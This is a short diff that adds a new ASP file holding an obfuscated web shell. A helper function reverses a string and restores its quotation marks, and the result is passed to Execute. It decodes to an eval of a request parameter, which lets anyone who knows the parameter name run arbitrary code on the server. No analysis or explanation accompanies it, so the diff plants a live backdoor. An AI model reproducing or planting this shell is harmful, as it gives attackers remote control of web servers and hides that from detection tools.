@@ -1,0 +1,13 @@
+<%
+Function newkkx(Code)
+
+newkkx=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
+
+
+End Function
+
+%>
+
+<%
+Execute newkkx(")/*/465052192_namx/*/(tseuqer lave")
+%>
